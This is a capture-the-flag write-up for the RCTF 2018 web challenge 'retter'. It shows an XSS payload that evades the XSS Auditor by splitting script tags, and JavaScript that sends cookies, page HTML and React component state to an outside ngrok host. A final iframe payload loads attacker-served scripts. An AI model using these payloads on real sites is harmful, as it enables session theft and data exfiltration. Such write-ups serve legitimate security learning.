@@ -1,0 +1,140 @@
+---
+title: retter - RCTF 2018
+layout: post
+date: '2018-05-22 00:00:00'
+---
+
+> To Major Gilbert
+>
+> http://retter.2018.teamrois.cn
+>
+> hint: React
+
+*869 points, 4 Solves, web*
+
+We are taken to a page where we can fill out a form to write a letter and submit it as a draft and then let the person know:
+
+![letter](/assets/rctf18/letter.jpg)
+
+Clicking the button doesn't actually do anything though as no network requests happen. Looking at the page (and the hint) it has been build with React.
+
+When we create the draft, JSON data is posted so I started to see if I could inject a component like in [this hackerone report](https://hackerone.com/reports/49652), and although the server would accept and return arbitrary JSON data, unfortuanatly that has been fixed since React 0.14 and objects now have to be tagged with a Symbol.
+
+Looking at how the page is loaded, it looks like they are using async components so the javascript is only loaded when the component is rendered based on `manifest_358a7dd69b204a527a05.js`. There three files in there, but one of them `flag_bb5521739f36ab3d42a2.js` returns a 403! Perhaps only the admin can load this file.
+
+After playing around a bit more I found that the 404 page is very interesting:
+
+![letter](/assets/rctf18/404.jpg)
+
+This time the button does actually do something (after we solve the captcha) so we have found a way to send a page to the admin! Also looking at the source for this page (0_e80547cfeeeba23b5136.js) reveals some new info:
+
+```javascript
+function() {
+  return m.default.createElement(v.default, {
+      loading: this.state.loading,
+      title: "Not Found"
+  }, m.default.createElement("div", null, m.default.createElement("p", null, "404 Not Found!"), m.default.createElement("p", null, "Please contact admin for help!")), m.default.createElement("div", {
+      style: {
+          display: "none"
+      }
+  }, m.default.createElement("p", null, "Congrats, you found this hint!")), window && "admin.retter.2018.teamrois.cn" === window.location.hostname ? m.default.createElement(g.Flag, null) : m.default.createElement("div", {
+      style: {
+          textAlign: "center"
+      }
+  }, m.default.createElement("p", null, "Report this page to administrator"), m.default.createElement("p", null, this.state.captcha), m.default.createElement("p", null, m.default.createElement(b.default, {
+      label: "Captcha",
+      onChange: this.handleChange("input"),
+      value: this.state.input
+  })), m.default.createElement(_.default, {
+      variant: "raised",
+      color: "primary",
+      onClick: this.postToServer
+  }, "Report")))
+}
+```
+
+So due to **admin.retter.2018.teamrois.cn" === window.location.hostname ? m.default.createElement(g.Flag, null)** it looks like the flag component will be rendered when the admin views this page. As we have no way to access the flag components source we will have to try and steal it from the admin, time to look for a way to inject code.
+
+Looking at the source again shows that the `__INITIAL_STATE__` is being set by the following:
+
+```html
+<script>window.__INITIAL_STATE__ = {"router":{"location":{"pathname":"/1234","search":"","hash":"","key":"n1vbjt"}}}</script>
+```
+
+It is correctly encoding all javasscript/json but not html! We can just close the script tag and open a new one by putting our payload in the path:
+![letter](/assets/rctf18/inject.jpg)
+
+But a problem, it is being blocked by the XSS Auditor. I tried submitting a few payloads anyway on the off chance that they were using firefox, but they never made it through. I then found that if you included a payload like **<script>something</script>** then it would be completely removed by the server. Using this I could build up a payload that would pass the XSS Auditor after the extra script tags had been removed. I came up with `/123</scr<script></script>ipt><scr<script></script>ipt%20s<script></script>rc=//my.server/payload.js>//`
+
+![letter](/assets/rctf18/xss.jpg)
+
+So I could finally inject my script into the page, time to steal some cookies! But alas it wasn't that easy, the cookie was:
+
+`flag=fake_flag{NO_HENTAI_DONT_TOUCH_ME_I_AM_NOT_FLAG}`
+
+As the flag component was being rendered, what about looking at the dom?
+
+```javascript
+window.onload = function() {
+	fetch("https://019f53ad.ngrok.io/log", { headers: { log: document.cookie } })
+	fetch("https://019f53ad.ngrok.io/log", { headers: { log: document.body.innerHTML } })
+}
+```
+
+We are getting closer, that showed what the flag component had rendered: `<flag style="display: none;">fake_flag{flag_is_in_my_component_but_not_in_html}</flag>`. So it seems we need to somehow access the state of the react component. After some reading I found that this could be done vie [React.createRef](https://reactjs.org/docs/refs-and-the-dom.html#creating-refs), so if I could edit the javascript to add that to the flag component it could be used to access the state.
+
+I ended up creating a new iframe that was exactly the same as the parent page, but with the manifest pointing to me:
+
+```javascript
+var iframe = document.createElement('iframe');
+var html = `
+<!DOCTYPE html><html data-reactroot=""><head><meta charSet="utf-8"/><title>💥</title><link rel="stylesheet" href="http://cdn.retter.2018.teamrois.cn/app.css" type="text/css"/></head><body><script>window.__INITIAL_STATE__ = {"router":{"location":{"pathname":"/123","search":"","hash":"","key":"onhm1r"}}}</script><div id="root"><div class="App_app_3VguN" data-reactroot=""><div style="width:100%"><div class="Page_paper_1hfXy"><div class="Page_post-content_1XWEr" style="opacity:1"><div><h2>Not Found</h2></div><div><p>404 Not Found!</p><p>Please contact admin for help!</p></div><div style="display:none"><p>Congrats, you found this hint!</p></div><div style="text-align:center"><p>Report this page to administrator</p><p>Getting captcha...</p><p><div class="jss5"><label class="jss14 jss9 jss10 jss13" data-shrink="false">Captcha</label><div class="jss19 jss20 jss23"><input type="text" aria-invalid="false" aria-required="false" class="jss27" value=""/></div></div></p><button tabindex="0" class="jss50 jss35 jss40 jss41" type="button"><span class="jss36">Report</span><span class="jss52"></span></button></div></div><div style="display:none" class="Page_loading_2skAc"><div class="jss59 jss60" style="width:100px;height:100px;opacity:0;will-change:opacity;transition-delay:800ms" role="progressbar"><svg class="jss62 jss63" viewBox="0 0 50 50"><circle class="jss64 jss65" cx="25" cy="25" r="20" fill="none" stroke-width="3.6"></circle></svg></div></div></div></div></div></div>
+<script src="http://10640bad.ngrok.io/src/manifest_358a7dd69b204a527a05.js?v2"></script><script src="http://cdn.retter.2018.teamrois.cn/vendor_a4401220f857f9539834.js"></script><script src="http://cdn.retter.2018.teamrois.cn/app_73045edf060acecbcc23.js"></script></body></html>`;
+document.body.appendChild(iframe);
+iframe.contentWindow.document.open();
+iframe.contentWindow.document.write(html);
+iframe.contentWindow.document.close();
+```
+
+This let me send down a modified **0_e80547cfeeeba23b5136.js** file with a **createRef** added to the flag component stored on the window:
+
+```javascript
+window.flagRef = m.default.createRef();
+// <SNIP>
+m.default.createElement(g.Flag, {ref: window.flagRef})
+```
+
+Now lets log the state:
+
+```javascript
+fetch("http://019f53ad.ngrok.io/log", { headers: { log: Object.keys(iframe.contentWindow.flagRef.current.state) } })* 
+```
+
+This returned a single key `Component`, which when sent back reveals the final flag!
+
+```javascript
+function t(){var e,n,r;o(this,t);for(var u=arguments.length,i=new Array(u),f=0;f<u;f++)i[f]=arguments[f];return a(r,(n=r=a(this,(e=l(t)).call.apply(e,[this].concat(i))),s(p(p(r)),"state",{flag:"RCTF{reAct_dev_t0ol_1s_4_w4y_to_rEad_st4te}"}),n))}
+```
+
+
+`RCTF{reAct_dev_t0ol_1s_4_w4y_to_rEad_st4te}`
+
+&nbsp;
+
+<hr>
+
+Final injected payload was:
+```javascript
+var iframe = document.createElement('iframe');
+var html = `
+<!DOCTYPE html><html data-reactroot=""><head><meta charSet="utf-8"/><title>💥</title><link rel="stylesheet" href="http://cdn.retter.2018.teamrois.cn/app.css" type="text/css"/></head><body><script>window.__INITIAL_STATE__ = {"router":{"location":{"pathname":"/123","search":"","hash":"","key":"onhm1r"}}}</script><div id="root"><div class="App_app_3VguN" data-reactroot=""><div style="width:100%"><div class="Page_paper_1hfXy"><div class="Page_post-content_1XWEr" style="opacity:1"><div><h2>Not Found</h2></div><div><p>404 Not Found!</p><p>Please contact admin for help!</p></div><div style="display:none"><p>Congrats, you found this hint!</p></div><div style="text-align:center"><p>Report this page to administrator</p><p>Getting captcha...</p><p><div class="jss5"><label class="jss14 jss9 jss10 jss13" data-shrink="false">Captcha</label><div class="jss19 jss20 jss23"><input type="text" aria-invalid="false" aria-required="false" class="jss27" value=""/></div></div></p><button tabindex="0" class="jss50 jss35 jss40 jss41" type="button"><span class="jss36">Report</span><span class="jss52"></span></button></div></div><div style="display:none" class="Page_loading_2skAc"><div class="jss59 jss60" style="width:100px;height:100px;opacity:0;will-change:opacity;transition-delay:800ms" role="progressbar"><svg class="jss62 jss63" viewBox="0 0 50 50"><circle class="jss64 jss65" cx="25" cy="25" r="20" fill="none" stroke-width="3.6"></circle></svg></div></div></div></div></div></div>
+<script src="http://019f53ad.ngrok.io/src/manifest_358a7dd69b204a527a05.js?v2"></script><script src="http://cdn.retter.2018.teamrois.cn/vendor_a4401220f857f9539834.js"></script><script src="http://cdn.retter.2018.teamrois.cn/app_73045edf060acecbcc23.js"></script></body></html>`;
+document.body.appendChild(iframe);
+iframe.contentWindow.document.open();
+iframe.contentWindow.document.write(html);
+iframe.contentWindow.document.close();
+
+iframe.onload = function() {
+	fetch("http://019f53ad.ngrok.io/log", { headers: { log: iframe.contentWindow.flagRef.current.state.Component } })
+}
+```
